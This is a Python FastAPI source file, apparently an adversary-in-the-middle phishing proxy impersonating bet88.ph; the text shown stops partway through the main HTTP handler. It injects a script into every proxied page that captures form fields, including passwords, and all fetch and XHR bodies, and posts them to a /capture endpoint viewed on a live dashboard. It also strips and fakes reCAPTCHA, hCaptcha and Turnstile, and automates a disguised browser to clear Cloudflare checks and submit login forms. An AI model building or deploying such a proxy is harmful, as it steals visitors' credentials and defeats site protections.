import sys
if sys.platform == "win32":
    import asyncio
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import re
import time
import uuid
import json
import asyncio
import random
import string
import websockets

from typing import Dict, List, Any, Optional
from datetime import datetime, timezone
from contextlib import asynccontextmanager

from curl_cffi.requests import AsyncSession
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket
from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from camoufox.async_api import AsyncCamoufox

import os
from dotenv import load_dotenv

load_dotenv()
PROXY_URL = os.getenv("PROXY_URL")  # optional: "http://user:pass@host:port"

# =========================================================
# [CONFIGURATION]
# =========================================================
TARGET_BASE   = "https://bet88.ph/"
TARGET_DOMAIN = urlparse(TARGET_BASE).netloc
TARGET_ORIGIN = TARGET_BASE.rstrip("/")

IMPERSONATE = "chrome120"

HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "host",
    "x-forwarded-for", "x-forwarded-proto", "x-real-ip", "via",
    "x-forwarded-host", "x-forwarded-port",
}

CF_COOKIE_NAMES  = {"cf_clearance", "__cfuid", "__cf_bm", "__cflb", "_cfuvid"}
TURNSTILE_PATTERNS = [
    re.compile(r"turnstile", re.I),
    re.compile(r"cf-turnstile", re.I),
    re.compile(r"cloudflare-challenge", re.I),
    re.compile(r"reCAPTCHA.*activated.*safe.*browsing", re.I),
]
COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
CDN_CGI_RE       = re.compile(r"^cdn-cgi/")
AUTH_KEYWORDS    = ["login", "auth", "signin", "token", "password", "register", "account", "create-account", "signup"]
SESSION_FILE     = "proxy_sessions.json"
SESSION_TIMEOUT  = 1800

# reCAPTCHA / CAPTCHA field names to strip from POST bodies
CAPTCHA_FIELD_NAMES = [
    "g-recaptcha-response",
    "recaptchaToken",
    "recaptcha_token",
    "recaptcha",
    "captcha",
    "captchaToken",
    "cf-turnstile-response",
    "h-captcha-response",
    "turnstileToken",
    "cf_turnstile_response",
    "token",
    "captchaResponse",
    "captcha_response",
    "captcha_verification",
    "g-recaptcha-response-sitekey",
    "recaptcha-response",
    "cf-response",
]

CHROME_NAV_HEADERS = [
    ("sec-ch-ua",          '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'),
    ("sec-ch-ua-mobile",   "?0"),
    ("sec-ch-ua-platform", '"Windows"'),
    ("sec-fetch-dest",     "document"),
    ("sec-fetch-mode",     "navigate"),
    ("sec-fetch-site",     "none"),
    ("sec-fetch-user",     "?1"),
    ("dnt",                "1"),
]

CHROME_FETCH_HEADERS = [
    ("sec-ch-ua",          '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'),
    ("sec-ch-ua-mobile",   "?0"),
    ("sec-ch-ua-platform", '"Windows"'),
    ("sec-fetch-dest",     "empty"),
    ("sec-fetch-mode",     "cors"),
    ("sec-fetch-site",     "same-origin"),
]

# =========================================================
# [GRECAPTCHA STUB SCRIPT]
# Injected into every HTML page to prevent reCAPTCHA from
# blocking form submissions when we strip the token.
# =========================================================
GRECAPTCHA_STUB = """<script>
(function() {
    // Stub out grecaptcha so forms don't block on it
    var _noop    = function() {};
    var _resolve = function() { return Promise.resolve('proxy-bypass-token'); };
    var _stub = {
        ready:      function(cb) { if (typeof cb === 'function') cb(); },
        execute:    function()   { return Promise.resolve('proxy-bypass-token'); },
        render:     function()   { return 0; },
        getResponse:function()   { return 'proxy-bypass-token'; },
        reset:      _noop,
    };
    // Define immediately
    window.grecaptcha = _stub;
    // Also override if something redefines it later
    Object.defineProperty(window, 'grecaptcha', {
        configurable: true,
        get: function() { return _stub; },
        set: function() {}   // silently swallow any attempt to replace
    });
    // Stub hcaptcha too for good measure
    window.hcaptcha = {
        execute:     _resolve,
        getResponse: function() { return 'proxy-bypass-token'; },
        render:      function() { return 0; },
        reset:       _noop,
    };
})();
</script>"""


# =========================================================
# [CAPTURE SCRIPT]
# =========================================================
def _rand(n: int = 12) -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=n))

_ATTR_ATTACHED = _rand()
_ATTR_METHOD   = _rand()
_ATTR_URL_KEY  = _rand()


def get_capture_script() -> str:
    return f"""<script>
(function(){{
    var _origFetch = window.fetch;

    var _cap = function(type, url, method, payload) {{
        try {{
            _origFetch('/capture', {{
                method:    'POST',
                headers:   {{'Content-Type': 'application/json'}},
                body:      JSON.stringify({{type:type, url:url, method:method.toUpperCase(), payload:payload}}),
                keepalive: true
            }});
        }} catch(e) {{}}
    }};

    var _af = function() {{
        document.querySelectorAll('form').forEach(function(f) {{
            if (f.dataset['{_ATTR_ATTACHED}']) return;
            f.dataset['{_ATTR_ATTACHED}'] = '1';
            f.addEventListener('submit', function() {{
                var d = {{}};
                f.querySelectorAll('input,textarea,select').forEach(function(el) {{
                    var n = el.name || el.id;
                    if (n) d[n] = (el.type==='checkbox'||el.type==='radio') ? el.checked : el.value;
                }});
                _cap('form', f.action || location.href, f.method || 'GET', d);
            }}, true);
        }});
    }};
    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', _af) : _af();
    new MutationObserver(_af).observe(document.documentElement, {{childList:true, subtree:true}});

    window.__origFetch__ = _origFetch;
    Object.defineProperty(window, 'fetch', {{
        enumerable: false, configurable: true, writable: true,
        value: function() {{
            var a = Array.prototype.slice.call(arguments);
            var res = a[0], cfg = a[1] || {{}};
            var url = typeof res === 'string' ? res : (res && res.url ? res.url : '');
            if (url !== '/capture')
                _cap('fetch', url, cfg.method||'GET', {{b: cfg.body ? cfg.body.toString() : null}});
            return _origFetch.apply(this, a);
        }}
    }});

    var _xp = XMLHttpRequest.prototype;
    var _oo = _xp.open, _os = _xp.send;
    Object.defineProperty(_xp, 'open', {{
        enumerable: false, configurable: true, writable: true,
        value: function(m, u) {{
            this['{_ATTR_METHOD}'] = m; this['{_ATTR_URL_KEY}'] = u;
            return _oo.apply(this, arguments);
        }}
    }});
    Object.defineProperty(_xp, 'send', {{
        enumerable: false, configurable: true, writable: true,
        value: function(body) {{
            if (this['{_ATTR_URL_KEY}'] !== '/capture')
                _cap('xhr', this['{_ATTR_URL_KEY}'], this['{_ATTR_METHOD}'],
                     {{b: body ? body.toString() : null}});
            return _os.apply(this, arguments);
        }}
    }});
}})();
</script>"""


# =========================================================
# [CLOUDFLARE SOLVER]
# =========================================================
class CFSolver:
    def __init__(self):
        self._global_lock = asyncio.Lock()
        self._shared_cookies: Dict[str, str] = {}
        self._user_agent: Optional[str] = None
        self._turnstile_token: Optional[str] = None

    async def start(self):
        print("[CF] Camoufox solver ready.")

    async def stop(self):
        pass

    async def solve(self, session_id: str, target_url: str = None, method: str = "GET", body: bytes = None) -> Dict[str, str]:
        async with self._global_lock:
            url_to_solve = target_url or TARGET_BASE

            if self._shared_cookies.get("cf_clearance"):
                print(f"[CF] Reusing cached clearance for {session_id[:8]}")
                return dict(self._shared_cookies)

            print(f"[CF] Solving for session {session_id[:8]} at {url_to_solve}…")
            try:
                async with AsyncCamoufox(
                    headless=False,
                    geoip=True,
                    humanize=True,
                    proxy={"server": PROXY_URL} if PROXY_URL else None,
                ) as browser:
                    page = await browser.new_page()

                    try:
                        await page.goto(url_to_solve, wait_until="networkidle", timeout=45000)
                    except Exception:
                        pass

                    await asyncio.sleep(5)

                    self._user_agent = await page.evaluate("navigator.userAgent")
                    print(f"[CF] Solver UA: {self._user_agent}")

                    try:
                        await page.wait_for_selector("iframe[src*='turnstile'], .cf-turnstile, [data-sitekey]", timeout=10000)
                        print("[CF] Turnstile widget detected, waiting for solve...")
                        await asyncio.sleep(15)
                    except Exception:
                        print("[CF] No Turnstile widget detected or timeout")

                    cf_cookies: Dict[str, str] = {}
                    for _ in range(45):
                        all_cookies = await page.context.cookies(TARGET_BASE)
                        cf_cookies = {
                            c["name"]: c["value"]
                            for c in all_cookies
                            if c["name"] in CF_COOKIE_NAMES
                        }
                        if "cf_clearance" in cf_cookies:
                            break
                        await asyncio.sleep(1)

                if "cf_clearance" in cf_cookies:
                    print(f"[CF] Solved for {session_id[:8]} — "
                          f"clearance: {cf_cookies['cf_clearance'][:20]}…")
                    self._shared_cookies = dict(cf_cookies)
                else:
                    print(f"[CF] Failed to get cf_clearance for {session_id[:8]}")

                return cf_cookies

            except Exception as e:
                print(f"[CF] Solver exception for {session_id[:8]}: {e}")
                return {}

    async def solve_with_browser(
        self,
        session_id: str,
        target_url: str,
        method: str = "POST",
        body: bytes = None,
        referer: str = None,
    ) -> Optional[Dict]:
        """
        Navigate in browser, solve Turnstile/reCAPTCHA, extract the solved
        token, inject it back into the body, then fire the real API request
        from within the browser context so cookies & headers are correct.
        """
        async with self._global_lock:
            print(f"[CF] Browser solve for {session_id[:8]} at {target_url}")
            browser = None
            try:
                browser = await AsyncCamoufox(
                    headless=False,
                    geoip=True,
                    humanize=True,
                    proxy={"server": PROXY_URL} if PROXY_URL else None,
                ).start()

                page = await browser.new_page()

                frontend_url = referer or TARGET_BASE
                print(f"[CF] Navigating to frontend: {frontend_url}")
                try:
                    await page.goto(frontend_url, wait_until="domcontentloaded", timeout=30000)
                    await page.wait_for_load_state("networkidle", timeout=15000)
                except Exception as e:
                    print(f"[CF] Frontend navigation warning: {e}")

                await asyncio.sleep(10)

                self._user_agent = await page.evaluate("navigator.userAgent")
                print(f"[CF] Browser solve UA: {self._user_agent}")

                # ── Wait for Turnstile / reCAPTCHA to auto-solve ──────────────
                solved_token: Optional[str] = None
                
                # First, check if there's already a solved token
                for attempt in range(8):
                    solved_token = await page.evaluate("""
                        () => {
                            // Turnstile hidden input
                            const ts = document.querySelector(
                                'input[name="cf-turnstile-response"]'
                            );
                            if (ts && ts.value && ts.value.length > 10) return ts.value;

                            // reCAPTCHA hidden input
                            const rc = document.querySelector(
                                '#g-recaptcha-response, textarea[name="g-recaptcha-response"]'
                            );
                            if (rc && rc.value && rc.value.length > 10) return rc.value;

                            // Turnstile JS API
                            if (window.turnstile) {
                                try {
                                    const t = window.turnstile.getResponse();
                                    if (t && t.length > 10) return t;
                                } catch(e) {}
                            }

                            // reCAPTCHA JS API
                            if (window.grecaptcha) {
                                try {
                                    const t = window.grecaptcha.getResponse();
                                    if (t && t.length > 10) return t;
                                } catch(e) {}
                            }

                            return null;
                        }
                    """)
                    if solved_token:
                        print(f"[CF] Got solved CAPTCHA token (attempt {attempt+1}): {solved_token[:30]}…")
                        break
                    await asyncio.sleep(2)
                
                # If no token yet, try to interact with reCAPTCHA iframe
                if not solved_token:
                    print("[CF] No token yet, trying to interact with reCAPTCHA...")
                    try:
                        recaptcha_iframe = await page.query_selector('iframe[src*="recaptcha"]')
                        if recaptcha_iframe:
                            print("[CF] Found reCAPTCHA iframe")
                            frame = await recaptcha_iframe.content_frame
                            if frame:
                                print("[CF] Switching to reCAPTCHA frame")
                                try:
                                    checkbox = await frame.wait_for_selector('.recaptcha-checkbox', timeout=5000)
                                    await checkbox.click()
                                    print("[CF] Clicked reCAPTCHA checkbox")
                                    await asyncio.sleep(5)
                                except Exception as e:
                                    print(f"[CF] Could not click checkbox in frame: {e}")
                    except Exception as e:
                        print(f"[CF] reCAPTCHA interaction failed: {e}")
                    
                    for attempt in range(15):
                        solved_token = await page.evaluate("""
                            () => {
                                const rc = document.querySelector('#g-recaptcha-response, textarea[name="g-recaptcha-response"]');
                                if (rc && rc.value && rc.value.length > 10) return rc.value;
                                if (window.grecaptcha) {
                                    try {
                                        const t = window.grecaptcha.getResponse();
                                        if (t && t.length > 10) return t;
                                    } catch(e) {}
                                }
                                return null;
                            }
                        """)
                        if solved_token:
                            print(f"[CF] Got reCAPTCHA token after interaction (attempt {attempt+1}): {solved_token[:30]}…")
                            break
                        await asyncio.sleep(3)

                if not solved_token:
                    print("[CF] Could not extract CAPTCHA token from browser — will proceed without it")

                # ── Get CF cookies ────────────────────────────────────────────
                all_cookies = await page.context.cookies()
                cf_cookies = {
                    c["name"]: c["value"]
                    for c in all_cookies
                    if c["name"] in CF_COOKIE_NAMES
                }
                print(f"[CF] Got CF cookies: {list(cf_cookies.keys())}")

                if cf_cookies.get("cf_clearance"):
                    self._shared_cookies = dict(cf_cookies)

                # ── Inject token into body and fire the real POST ─────────────
                if method == "POST" and body:
                    try:
                        body_json = json.loads(body.decode("utf-8", errors="replace"))

                        # Inject the solved token under all common field names
                        if solved_token:
                            body_json["cf-turnstile-response"]  = solved_token
                            body_json["g-recaptcha-response"]   = solved_token
                            body_json["h-captcha-response"]     = solved_token
                            body_json["recaptchaToken"]         = solved_token
                            body_json["captchaToken"]           = solved_token
                            body_json["token"]                  = solved_token
                            body_json["captchaResponse"]        = solved_token
                            body_json["captcha_response"]       = solved_token
                            print(f"[CF] Injecting token into body: {solved_token[:30]}...")
                            print(f"[CF] Full body being sent: {json.dumps(body_json)[:500]}")
                        else:
                            # No token — strip any stale/empty captcha fields instead
                            for field in CAPTCHA_FIELD_NAMES:
                                body_json.pop(field, None)

                        print(f"[CF] Firing browser API POST to {target_url}")
                        print(f"[CF] Request body: {json.dumps(body_json)[:500]}")
                        api_resp = await page.request.post(
                            target_url,
                            data=json.dumps(body_json),
                            headers={"Content-Type": "application/json"},
                        )
                        status    = api_resp.status
                        resp_text = await api_resp.text()
                        print(f"[CF] Browser API POST: status={status}, body={resp_text[:300]}")
                        return {
                            "cookies": cf_cookies,
                            "result":  {"status": status, "body": resp_text},
                        }

                    except json.JSONDecodeError:
                        # Body isn't JSON (e.g. form-urlencoded) — fall through
                        print("[CF] Body is not JSON, falling through to form-fill")
                    except Exception as e:
                        print(f"[CF] Browser API POST failed: {e}")
                        import traceback; traceback.print_exc()

                # ── Fallback: try to fill + submit the actual HTML form ────────
                if method == "POST" and body:
                    try:
                        body_str  = body.decode("utf-8", errors="replace")
                        body_data = json.loads(body_str)
                        email     = body_data.get("email", "")
                        password  = body_data.get("password", "")

                        if email and password:
                            print("[CF] Attempting HTML form fill fallback")

                            try:
                                email_input = await page.wait_for_selector(
                                    'input[type="email"], input[name="email"], '
                                    'input[placeholder*="email" i]',
                                    timeout=5000,
                                )
                                await email_input.fill(email)
                                print("[CF] Filled email")
                            except Exception:
                                print("[CF] Could not find email field")

                            try:
                                pw_input = await page.wait_for_selector(
                                    'input[type="password"], input[name="password"]',
                                    timeout=5000,
                                )
                                await pw_input.fill(password)
                                print("[CF] Filled password")
                            except Exception:
                                print("[CF] Could not find password field")

                            # Wait for CAPTCHA to solve
                            print("[CF] Waiting for CAPTCHA to auto-solve before submit…")
                            await asyncio.sleep(20)

                            try:
                                submit_btn = await page.wait_for_selector(
                                    'button[type="submit"], input[type="submit"], '
                                    'button:has-text("Register"), button:has-text("Sign Up"), '
                                    'button:has-text("Create")',
                                    timeout=5000,
                                )
                                await submit_btn.click()
                                print("[CF] Clicked submit button")
                                await asyncio.sleep(5)

                                current_url = page.url
                                body_text   = await page.evaluate("() => document.body.innerText")
                                print(f"[CF] After submit — URL: {current_url}, body: {body_text[:300]}")

                                return {
                                    "cookies": cf_cookies,
                                    "result": {
                                        "status": 200,
                                        "body":   body_text,
                                        "url":    current_url,
                                    },
                                }
                            except Exception as e:
                                print(f"[CF] Could not click submit: {e}")

                    except Exception as e:
                        print(f"[CF] Form fill fallback error: {e}")

                # Return at minimum the cookies
                return {"cookies": cf_cookies}

            except Exception as e:
                print(f"[CF] Browser solve exception: {e}")
                import traceback; traceback.print_exc()
                return None
            finally:
                if browser:
                    try:
                        await browser.close()
                    except Exception:
                        pass


cf_solver = CFSolver()


# =========================================================
# [URL REWRITING]
# =========================================================
TARGET_DOMAIN_RE = re.compile(
    r"(?i)(https?:)?//((?:[a-z0-9-]+\.)*?)" + re.escape(TARGET_DOMAIN)
)

def _build_proxy_url(proxy_domain: str, sub: str) -> str:
    sub = sub.rstrip(".")
    if sub:
        return f"http://{proxy_domain}/__sub/{sub}"
    return f"http://{proxy_domain}"

def rewrite_url(url: str, proxy_domain: str, base_url: str = None) -> str:
    if not url:
        return url
    if url.startswith("//" + TARGET_DOMAIN):
        url = "https:" + url
    if base_url and url.startswith("/") and not url.startswith("//"):
        url = urljoin(base_url, url)
    url = TARGET_DOMAIN_RE.sub(lambda m: _build_proxy_url(proxy_domain, m.group(2)), url)
    return url

def rewrite_css(css: str, proxy_domain: str) -> str:
    if not css:
        return css
    def _r(m):
        return f"url({m.group(1)}{rewrite_url(m.group(2), proxy_domain)}{m.group(3)})"
    return re.sub(r'url\(([\'"]?)(.*?)([\'"]?)\)', _r, css)

def rewrite_json_obj(data: Any, proxy_domain: str) -> Any:
    if isinstance(data, dict):
        return {k: rewrite_json_obj(v, proxy_domain) for k, v in data.items()}
    if isinstance(data, list):
        return [rewrite_json_obj(i, proxy_domain) for i in data]
    if isinstance(data, str) and TARGET_DOMAIN_RE.search(data):
        return rewrite_url(data, proxy_domain)
    return data

def rewrite_fast(text: str, proxy_domain: str) -> str:
    return TARGET_DOMAIN_RE.sub(
        lambda m: _build_proxy_url(proxy_domain, m.group(2)), text
    )


# =========================================================
# [RECAPTCHA HELPERS]
# =========================================================

def strip_recaptcha_from_html(soup: BeautifulSoup) -> BeautifulSoup:
    """
    Remove reCAPTCHA / hCaptcha / Turnstile script tags and widget divs,
    then inject a stub so JS code that calls grecaptcha.execute() still works.
    """
    # Remove external CAPTCHA script tags
    captcha_script_patterns = re.compile(
        r"recaptcha|hcaptcha|turnstile", re.I
    )
    for tag in soup.find_all("script", src=True):
        if captcha_script_patterns.search(tag.get("src", "")):
            tag.decompose()

    # Remove reCAPTCHA widget divs
    for tag in soup.find_all("div", class_=True):
        classes = " ".join(tag.get("class", []))
        if captcha_script_patterns.search(classes):
            tag.decompose()

    # Remove any hidden captcha response inputs so they don't confuse the backend
    for tag in soup.find_all("input", attrs={"name": True}):
        if tag["name"].lower() in [f.lower() for f in CAPTCHA_FIELD_NAMES]:
            tag.decompose()

    # Inject stub BEFORE everything else in <head>
    stub_soup = BeautifulSoup(GRECAPTCHA_STUB, "html.parser")
    head_tag  = soup.find("head")
    if head_tag:
        head_tag.insert(0, stub_soup)
    elif soup.find("body"):
        soup.find("body").insert(0, stub_soup)
    else:
        soup.insert(0, stub_soup)

    return soup


def strip_captcha_fields_from_body(body: bytes, content_type: str = "") -> bytes:
    """
    Remove CAPTCHA token fields from a POST body.
    Handles both JSON and application/x-www-form-urlencoded.
    Returns the (possibly modified) body bytes.
    """
    if not body:
        return body

    # ── JSON ──────────────────────────────────────────────────────────────────
    if "json" in content_type or body.lstrip().startswith(b"{"):
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            changed = False
            for field in CAPTCHA_FIELD_NAMES:
                if field in data:
                    del data[field]
                    changed = True
            if changed:
                print(f"[CAPTCHA] Stripped captcha fields from JSON body")
            return json.dumps(data).encode("utf-8") if changed else body
        except (json.JSONDecodeError, Exception):
            pass

    # ── Form-urlencoded ───────────────────────────────────────────────────────
    if "urlencoded" in content_type or b"=" in body:
        try:
            from urllib.parse import parse_qs, urlencode
            parsed  = parse_qs(body.decode("utf-8", errors="replace"), keep_blank_values=True)
            changed = False
            for field in CAPTCHA_FIELD_NAMES:
                if field in parsed:
                    del parsed[field]
                    changed = True
            if changed:
                print(f"[CAPTCHA] Stripped captcha fields from urlencoded body")
                return urlencode(
                    {k: v[0] for k, v in parsed.items()}, doseq=False
                ).encode("utf-8")
        except Exception:
            pass

    return body


# =========================================================
# [LOGGER]
# =========================================================
class ProxyLogger:
    def __init__(self, max_logs: int = 1000):
        self.logs: List[dict] = []
        self.max_logs = max_logs
        self.lock = asyncio.Lock()

    async def log(self, event_type: str, session_id: str = "N/A",
                  method: str = "-", path: str = "-",
                  status: int = 0, data: dict = None):
        entry = {
            "timestamp":  datetime.now(timezone.utc).isoformat(),
            "type":       event_type,
            "session_id": session_id,
            "method":     method,
            "path":       path,
            "status":     status,
            "data":       data or {},
        }
        async with self.lock:
            self.logs.insert(0, entry)
            if len(self.logs) > self.max_logs:
                self.logs.pop()

    async def get_all(self) -> List[dict]:
        async with self.lock:
            return list(self.logs)

proxy_logger = ProxyLogger()


# =========================================================
# [SESSION MANAGER]
# =========================================================
class SessionManager:
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    async def load(self):
        try:
            with open(SESSION_FILE) as f:
                async with self.lock:
                    self.sessions = json.load(f)
            print(f"[*] Loaded {len(self.sessions)} sessions.")
        except (FileNotFoundError, json.JSONDecodeError):
            print("[*] No session file — starting fresh.")

    async def save(self):
        async with self.lock:
            with open(SESSION_FILE, "w") as f:
                json.dump(self.sessions, f)

    async def get_or_create(self, sid: str = None) -> str:
        async with self.lock:
            now = time.time()
            if sid and sid in self.sessions:
                self.sessions[sid]["last_accessed"] = now
                return sid
            new_id = str(uuid.uuid4())
            self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
            asyncio.create_task(proxy_logger.log("session_created", session_id=new_id))
            return new_id

    async def get_cookies(self, sid: str) -> dict:
        async with self.lock:
            s = self.sessions.get(sid)
            if s:
                s["last_accessed"] = time.time()
                return s["cookies"].copy()
            return {}

    async def has_clearance(self, sid: str) -> bool:
        cookies = await self.get_cookies(sid)
        return "cf_clearance" in cookies or cookies.get("_cf_solve_attempted") == "1"

    async def update_cookies(self, sid: str, new: dict):
        if not new:
            return
        async with self.lock:
            if sid not in self.sessions:
                return
            stored = self.sessions[sid]["cookies"]
            for k, v in new.items():
                if k in CF_COOKIE_NAMES and k in stored and not v:
                    continue
                stored[k] = v
        asyncio.create_task(self.save())

    async def cleanup_loop(self):
        while True:
            await asyncio.sleep(60)
            now = time.time()
            expired = []
            async with self.lock:
                for sid, d in self.sessions.items():
                    if now - d["last_accessed"] > SESSION_TIMEOUT:
                        expired.append(sid)
                for sid in expired:
                    del self.sessions[sid]
            if expired:
                print(f"[*] Expired {len(expired)} sessions.")
                await self.save()

session_manager = SessionManager()


# =========================================================
# [APP LIFESPAN]
# =========================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    await session_manager.load()
    await cf_solver.start()
    cleanup_task = asyncio.create_task(session_manager.cleanup_loop())
    yield
    cleanup_task.cancel()
    await cf_solver.stop()
    await session_manager.save()

app = FastAPI(lifespan=lifespan)

curl_client = AsyncSession(
    impersonate=IMPERSONATE,
    verify=True,
    proxies={"https": PROXY_URL, "http": PROXY_URL} if PROXY_URL else None,
    timeout=30,
)


# =========================================================
# [DASHBOARD]
# =========================================================
@app.get("/_proxy_api/logs")
async def api_logs():
    return JSONResponse({"logs": await proxy_logger.get_all()})


@app.get("/_proxy_dashboard", response_class=HTMLResponse)
async def dashboard():
    return HTMLResponse("""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Proxy Dashboard</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-gray-200 p-6 font-sans">
<div class="max-w-7xl mx-auto">
  <div class="flex justify-between items-center mb-6">
    <h1 class="text-3xl font-bold text-white">📡 Live Proxy Dashboard</h1>
    <label class="flex items-center space-x-2 cursor-pointer">
      <input type="checkbox" id="ar" class="h-5 w-5" checked>
      <span>Auto-Refresh (2s)</span>
    </label>
  </div>
  <div class="bg-gray-800 rounded-lg shadow overflow-x-auto">
    <table class="min-w-full divide-y divide-gray-700">
      <thead class="bg-gray-700"><tr>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Time</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Type</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Session</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Method / Path</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Status</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Payload</th>
      </tr></thead>
      <tbody id="tb" class="divide-y divide-gray-700"></tbody>
    </table>
  </div>
</div>
<script>
let iv;
async function load() {
  const d = await (await fetch('/_proxy_api/logs')).json();
  const tb = document.getElementById('tb');
  tb.innerHTML = '';
  d.logs.forEach(l => {
    const tr = document.createElement('tr');
    const c = l.type === 'auth_intercept'   ? 'text-red-400 font-bold'
             : l.type === 'cf_solving'       ? 'text-orange-400 font-bold'
             : l.type === 'cf_solved'        ? 'text-green-400 font-bold'
             : l.type === 'cf_solve_failed'  ? 'text-red-400'
             : l.type.startsWith('capture') ? 'text-yellow-400'
             : 'text-blue-400';
    const ds = Object.keys(l.data).length ? JSON.stringify(l.data, null, 2) : '-';
    tr.innerHTML = `      <td class="px-4 py-3 text-xs text-gray-400 align-top whitespace-nowrap">
        ${new Date(l.timestamp).toLocaleTimeString()}</td>
      <td class="px-4 py-3 text-xs ${c} align-top">${l.type.toUpperCase()}</td>
      <td class="px-4 py-3 text-xs text-gray-400 align-top" title="${l.session_id}">
        ${l.session_id.substring(0,8)}…</td>
      <td class="px-4 py-3 text-xs align-top">
        <span class="font-bold">${l.method}</span><br>
        <span class="text-gray-500 truncate block max-w-xs" title="${l.path}">${l.path}</span></td>
      <td class="px-4 py-3 text-xs text-gray-400 align-top">${l.status || '-'}</td>
      <td class="px-4 py-3 text-xs align-top">
        <div class="max-h-40 max-w-lg overflow-auto bg-gray-900 p-2 rounded border border-gray-700">
          <pre class="whitespace-pre-wrap break-all text-xs">${ds}</pre>
        </div></td>`;
    tb.appendChild(tr);
  });
}
function toggle() {
  clearInterval(iv);
  if (document.getElementById('ar').checked) iv = setInterval(load, 2000);
}
document.getElementById('ar').addEventListener('change', toggle);
load(); toggle();
</script></body></html>""")


# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================
@app.post("/capture")
async def capture(request: Request, data: dict):
    sid = request.cookies.get("proxy_session_id", "N/A")
    await proxy_logger.log(
        f"capture_{data.get('type', '?')}",
        sid,
        data.get("method", "POST"),
        data.get("url", "/capture"),
        data=data.get("payload", {}),
    )
    return JSONResponse({"status": "ok"})


# =========================================================
# [WEBSOCKET PROXY]
# =========================================================
@app.websocket("/{path:path}")
async def ws_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    sid        = websocket.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create(sid)
    cookies    = await session_manager.get_cookies(session_id)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    ws_headers = {"Origin": TARGET_ORIGIN}
    if cookie_str:
        ws_headers["Cookie"] = cookie_str
    for h in ("sec-websocket-extensions", "sec-websocket-protocol", "sec-websocket-version"):
        v = websocket.headers.get(h)
        if v:
            ws_headers[h] = v

    ws_base    = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_url = urljoin(ws_base.rstrip("/") + "/", path)
    if websocket.url.query:
        target_url += f"?{websocket.url.query}"

    try:
        async with websockets.connect(target_url, extra_headers=ws_headers) as tws:
            async def to_target():
                try:
                    while True:
                        msg = await websocket.receive()
                        if "text"    in msg: await tws.send(msg["text"])
                        elif "bytes" in msg: await tws.send(msg["bytes"])
                        elif msg["type"] == "websocket.disconnect": break
                except Exception as e:
                    await proxy_logger.log("ws_client_error", session_id, data={"error": str(e)})

            async def to_client():
                try:
                    while True:
                        d = await tws.recv()
                        if isinstance(d, str): await websocket.send_text(d)
                        else:                  await websocket.send_bytes(d)
                except websockets.exceptions.ConnectionClosed:
                    pass
                except Exception as e:
                    await proxy_logger.log("ws_upstream_error", session_id, data={"error": str(e)})

            await asyncio.gather(to_target(), to_client())
    except Exception as e:
        await proxy_logger.log("ws_failed", session_id, data={"error": str(e)})
    finally:
        try:
            await websocket.close()
        except Exception:
            pass


CAPTCHA_PENDING: Dict[str, dict] = {}

@app.get("/_captcha")
async def captcha_page(request: Request):
    sitekey = "6LfGi9QlAAAAAAZh6t1Kesb9MCI9Fl-Xa75XMLXR"
    return HTMLResponse(f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Security Check</title>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<style>
body {{ background: #1a1a2e; color: #eee; font-family: system-ui; display: flex;
       justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
.card {{ background: #16213e; padding: 2rem; border-radius: 12px; text-align: center; max-width: 400px; }}
h2 {{ margin-top: 0; }}
.g-recaptcha {{ margin: 1.5rem 0; }}
#status {{ margin-top: 1rem; font-size: 0.9rem; color: #aaa; }}
</style></head><body>
<div class="card">
<h2>🛡️ Security Verification</h2>
<p>Please complete the reCAPTCHA to continue.</p>
<div class="g-recaptcha" data-sitekey="{sitekey}" data-callback="onSolved"></div>
<div id="status">Waiting for verification...</div>
</div>
<script>
function onSolved(token) {{
    document.getElementById('status').textContent = 'Verifying...';
    fetch('/_captcha/solve', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{token: token}})
    }}).then(r => r.json()).then(d => {{
        if (d.ok) {{
            document.getElementById('status').textContent = '✓ Verified! Redirecting...';
            setTimeout(() => window.close(), 1500);
        }} else {{
            document.getElementById('status').textContent = '✗ Failed: ' + (d.error || 'Unknown error');
        }}
    }}).catch(e => {{
        document.getElementById('status').textContent = '✗ Error: ' + e.message;
    }});
}}
</script></body></html>""")

@app.post("/_captcha/solve")
async def captcha_solve(request: Request):
    data  = await request.json()
    token = data.get("token", "")
    sid   = request.cookies.get("proxy_session_id", "")
    if sid in CAPTCHA_PENDING:
        CAPTCHA_PENDING[sid]["token"]  = token
        CAPTCHA_PENDING[sid]["solved"] = True
        return JSONResponse({"ok": True})
    return JSONResponse({"ok": False, "error": "No pending captcha"})


# =========================================================
# [HTTP PROXY — main handler]
# =========================================================
@app.api_route(
    "/{path:path}",
